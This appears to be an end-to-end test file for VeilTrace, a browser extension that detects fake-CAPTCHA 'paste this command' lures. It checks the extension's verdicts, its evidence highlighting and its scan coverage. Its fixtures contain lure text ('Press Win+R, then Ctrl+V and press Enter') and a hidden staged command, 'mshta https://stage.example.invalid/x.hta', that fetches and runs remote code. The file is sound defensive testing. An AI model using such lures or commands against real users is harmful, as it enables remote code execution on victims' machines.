// End-to-end tests with the real unpacked extension (TEST build) loaded in Chromium.
import { pathToFileURL } from 'node:url';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { addCorpusScenario, html, launchExtension, openPopup, openTarget, rules, scan, scanUrl, shot, tabIdOf, verdict, type Loaded } from './helpers.js';
import { perfPages } from '../../src/eval/perfpages.js';

let l: Loaded;
beforeAll(async () => { l = await launchExtension('test'); });
afterAll(async () => { await l.context.close(); });

const overlayCount = (p: import('playwright').Page) => p.evaluate(() => document.querySelectorAll('[data-veiltrace-highlight]').length);

describe('installation and on-demand scanning', () => {
  it('installs: the popup loads with branding and an explicit Scan button, and nothing is injected before the click', async () => {
    const url = addCorpusScenario(l, 'dev', 'D01-en-blog-security-check-overlay');
    const target = await openTarget(l, url);
    const popup = await openPopup(l, await tabIdOf(l, target));
    expect(await popup.textContent('h1')).toBe('VeilTrace');
    expect(await popup.textContent('#scan')).toBe('Scan page');
    expect(await popup.getAttribute('body', 'data-state')).toBe('idle');
    expect(await popup.getAttribute('body', 'data-injections')).toBeNull();
    expect(await popup.isHidden('#result')).toBe(true);
    expect(await target.evaluate(() => document.querySelectorAll('[data-veiltrace-highlight]').length)).toBe(0);
    await shot(popup, '01-idle');
  });
});

describe('detection through the extension (dev corpus pages)', () => {
  it('fake CAPTCHA overlay → manipulative (R1), with evidence snippets and rule explanation', async () => {
    const { popup, state } = await scanUrl(l, addCorpusScenario(l, 'dev', 'D01-en-blog-security-check-overlay'));
    expect(state).toBe('done');
    expect(await verdict(popup)).toBe('manipulative_instruction');
    expect(await rules(popup)).toContain('R1:manipulative_instruction');
    expect(await popup.textContent('.summary h2')).toBe('Manipulative instruction detected');
    expect(await popup.$$eval('.snippet', (e) => e.length)).toBeGreaterThanOrEqual(3);
    expect(await popup.textContent('.explain')).toContain('human-verification');
    expect(await popup.textContent('.coverage h3')).toBe('Complete scan');
    await shot(popup, '02-manipulative');
  });

  it('legitimate technical documentation → no suspicious instructions; observed instruction listed separately', async () => {
    const { popup } = await scanUrl(l, addCorpusScenario(l, 'dev', 'D16-en-vendor-install-script'));
    expect(await verdict(popup)).toBe('observed_instruction');
    expect(await popup.textContent('.summary h2')).toBe('No suspicious instructions detected in the analyzed content.');
    expect(await popup.textContent('details.observed summary')).toContain('Observed instructions without manipulation signs (1)');
    expect((await popup.textContent('body'))?.toLowerCase()).not.toMatch(/\bsafe\b/);
    await shot(popup, '03-docs-observed');
  });

  it('Indonesian manipulation (UGC comment on a recipe blog) → manipulative', async () => {
    const { popup } = await scanUrl(l, addCorpusScenario(l, 'dev', 'D06-id-recipe-comment-lure'));
    expect(await verdict(popup)).toBe('manipulative_instruction');
    expect(await popup.$$eval('.snippet', (e) => e.map((x) => x.textContent))).toEqual(expect.arrayContaining(['verifikasi manusia', 'Win + R', 'Ctrl + V']));
  });

  it('trusted-domain page with injected content (vendor KB comment) → manipulative', async () => {
    const { popup } = await scanUrl(l, addCorpusScenario(l, 'dev', 'D05-en-docs-comment-lure'));
    expect(await verdict(popup)).toBe('manipulative_instruction');
  });

  it('news report and educational counterexamples → no suspicious instructions', async () => {
    for (const id of ['D20-en-news-clickfix-campaign', 'D21-en-security-blog-code-example', 'D31-id-negation-awareness']) {
      const { popup } = await scanUrl(l, addCorpusScenario(l, 'dev', id));
      expect(['none', 'observed_instruction'], id).toContain(await verdict(popup));
    }
  });
});

describe('evidence highlighting', () => {
  it('highlights the evidence element with a temporary overlay and cleans up, without touching the element', async () => {
    const url = 'https://hl.test/';
    l.pages.set(url, html(`<div style="height:1400px">long intro</div>
      <div id="lure" role="dialog"><p>Verify you are human</p><p id="step">Press Win+R, then Ctrl+V and press Enter.</p>
      <input id="field" value="keep-me"><button id="b" onclick="window.__clicked = true">OK</button></div>`));
    const { target, popup } = await scanUrl(l, url);
    const before = await target.evaluate(() => ({ style: document.getElementById('step')!.getAttribute('style'), html: document.getElementById('lure')!.outerHTML }));
    await popup.click('article.finding button:has-text("Show on page") >> nth=1');
    await popup.waitForSelector('.hl-status[data-result]');
    expect(await popup.getAttribute('.hl-status[data-result]', 'data-result')).toBe('highlighted');
    expect(await overlayCount(target)).toBe(1);
    const geo = await target.evaluate(() => {
      const box = document.querySelector('[data-veiltrace-highlight]')!.getBoundingClientRect();
      const el = document.getElementById('step')!.getBoundingClientRect();
      return { contains: box.left <= el.left && box.top <= el.top && box.right >= el.right && box.bottom >= el.bottom, inView: el.top >= 0 && el.bottom <= innerHeight };
    });
    expect(geo).toEqual({ contains: true, inView: true });
    const after = await target.evaluate(() => ({
      style: document.getElementById('step')!.getAttribute('style'), html: document.getElementById('lure')!.outerHTML,
      value: (document.getElementById('field') as HTMLInputElement).value, clicked: (window as unknown as { __clicked?: boolean }).__clicked ?? false,
    }));
    expect(after).toEqual({ ...before, value: 'keep-me', clicked: false });
    await shot(target, '04b-highlight-on-page');
    await target.waitForTimeout(1800);
    expect(await overlayCount(target)).toBe(0);
    await shot(popup, '04-highlight');
  });

  it('reports a stale locator instead of claiming a highlight', async () => {
    const { target, popup } = await scanUrl(l, addCorpusScenario(l, 'dev', 'D01-en-blog-security-check-overlay'));
    await target.evaluate(() => document.getElementById('gate')!.remove());
    await popup.click('article.finding button:has-text("Show on page") >> nth=0');
    await popup.waitForSelector('.hl-status[data-result]');
    expect(await popup.getAttribute('.hl-status[data-result]', 'data-result')).toBe('not-found');
    expect(await popup.textContent('.hl-status[data-result]')).toContain('no longer on the page');
    expect(await overlayCount(target)).toBe(0);
  });

  it('does not claim to highlight hidden clipboard text', async () => {
    // R2: human-verification pretext + verify button + staged command in an off-screen textarea.
    const url = 'https://stage.test/';
    l.pages.set(url, html(`<div role="dialog"><h2>Verify you are human</h2><p>Click the "Verify" button to continue.</p>
      <button class="copy-btn">Verify</button><textarea style="position:absolute;left:-9999px">mshta https://stage.example.invalid/x.hta</textarea></div>`));
    const { target, popup } = await scanUrl(l, url);
    expect(await rules(popup)).toEqual(['R2:manipulative_instruction']);
    const labels = await popup.$$eval('.evidence li', (lis) => lis.map((li) => li.querySelector('.ev-label')!.textContent));
    const idx = labels.findIndex((t) => t?.includes('Hidden clipboard text'));
    expect(idx).toBeGreaterThanOrEqual(0);
    await popup.click(`.evidence li >> nth=${idx} >> button`);
    await popup.waitForSelector('.hl-status[data-result]');
    expect(await popup.getAttribute('.hl-status[data-result]', 'data-result')).toBe('not-visible');
    expect(await overlayCount(target)).toBe(0);
  });
});

describe('dynamic content, partial scans and failures', () => {
  it('a modal revealed by user interaction is found on a rescan', async () => {
    const url = addCorpusScenario(l, 'dev', 'D02-id-download-modal-after-click');
    const target = await openTarget(l, url);
    const popup = await openPopup(l, await tabIdOf(l, target));
    await scan(popup);
    expect(await verdict(popup)).toBe('none');
    await target.click('#dl');
    expect(await popup.textContent('#scan')).toBe('Scan again');
    await scan(popup);
    expect(await verdict(popup)).toBe('manipulative_instruction');
  });

  it('reports a partial scan prominently on a very large page', async () => {
    const shop = perfPages().find((p) => p.id === 'shop-2500-cards')!;
    l.pages.set('https://bigshop2.test/', shop.html);
    const r = await scanUrl(l, 'https://bigshop2.test/');
    expect(await r.popup.getAttribute('.coverage', 'data-complete')).toBe('false');
    expect(await r.popup.textContent('.coverage h3')).toBe('Partial scan: some content was not examined');
    expect(await r.popup.$$eval('.coverage li', (lis) => lis.map((li) => li.getAttribute('data-reason')))).toEqual(['block-budget']);
    expect(await r.popup.textContent('.summary p')).toContain('Part of the page could not be examined');
    await shot(r.popup, '05-partial');
  });

  it('handles browser-protected pages without attempting a scan', async () => {
    const target = await l.context.newPage();
    await target.goto('chrome://version');
    const popup = await openPopup(l, await tabIdOf(l, target));
    expect(await popup.getAttribute('body', 'data-state')).toBe('error');
    expect(await popup.textContent('[role="alert"] strong')).toBe('This page cannot be scanned');
    expect(await popup.isDisabled('#scan')).toBe(true);
    await shot(popup, '06-restricted');
  });

  it('reports a failure when the page disappears before scanning', async () => {
    const url = 'https://gone.test/';
    l.pages.set(url, html('<p>temporary</p>'));
    const target = await openTarget(l, url);
    const popup = await openPopup(l, await tabIdOf(l, target));
    await target.close();
    expect(await scan(popup)).toBe('error');
    expect(await popup.textContent('[role="alert"] strong')).toBe('VeilTrace could not access this page');
  });

  it('a local file:// page without file access is reported as not scannable', async () => {
    const target = await l.context.newPage();
    await target.goto(pathToFileURL('corpus/dev/D01-en-blog-security-check-overlay/index.html').href);
    const popup = await openPopup(l, await tabIdOf(l, target));
    expect(await popup.getAttribute('body', 'data-state')).toBe('error');
    expect(await popup.isDisabled('#scan')).toBe(true);
  });
});

describe('shadow DOM and frames in the isolated world', () => {
  it('open shadow DOM widget lure is detected and highlighted inside the shadow root', async () => {
    const { target, popup } = await scanUrl(l, addCorpusScenario(l, 'dev', 'D07-en-shadow-dom-widget-lure'));
    expect(await verdict(popup)).toBe('manipulative_instruction');
    await popup.click('article.finding button:has-text("Show on page") >> nth=0');
    await popup.waitForSelector('.hl-status[data-result]');
    expect(await popup.getAttribute('.hl-status[data-result]', 'data-result')).toBe('highlighted');
    expect(await overlayCount(target)).toBe(1);
  });

  it('CLOSED shadow root content is read through chrome.dom.openOrClosedShadowRoot in the isolated world', async () => {
    const url = 'https://closed.test/';
    l.pages.set(url, html('<p>Weather today</p><x-closed></x-closed>', `<script>
      customElements.define('x-closed', class extends HTMLElement { constructor(){ super(); const r = this.attachShadow({mode:'closed'});
      r.innerHTML = '<div role="dialog"><h3>Verify you are human</h3><p>Press Win + R, then Ctrl + V and press Enter.</p></div>'; } });</script>`));
    const { popup } = await scanUrl(l, url);
    expect(await verdict(popup)).toBe('manipulative_instruction');
    expect(await popup.getAttribute('.coverage', 'data-complete')).toBe('true');
  });

  it('same-origin iframe lure is detected and highlighted; cross-origin iframe is reported as not examined', async () => {
    const same = await scanUrl(l, addCorpusScenario(l, 'dev', 'D08-en-same-origin-support-iframe'));
    expect(await verdict(same.popup)).toBe('manipulative_instruction');
    await same.popup.click('article.finding button:has-text("Show on page") >> nth=0');
    await same.popup.waitForSelector('.hl-status[data-result]');
    expect(await same.popup.getAttribute('.hl-status[data-result]', 'data-result')).toBe('highlighted');

    l.pages.set('https://ads.example/lure.html', html('<h3>Verify you are human</h3><p>Press Win + R, then Ctrl + V and press Enter.</p>'));
    l.pages.set('https://portal.test/', html('<p>Portal news</p><iframe src="https://ads.example/lure.html" width="400" height="200"></iframe>'));
    const cross = await scanUrl(l, 'https://portal.test/');
    expect(await verdict(cross.popup)).toBe('none');
    expect(await cross.popup.$$eval('.coverage li', (lis) => lis.map((li) => li.getAttribute('data-reason')))).toEqual(['frames-skipped']);
    expect(await cross.popup.textContent('.summary h2')).toBe('No suspicious instructions detected in the analyzed content.');
  });
});
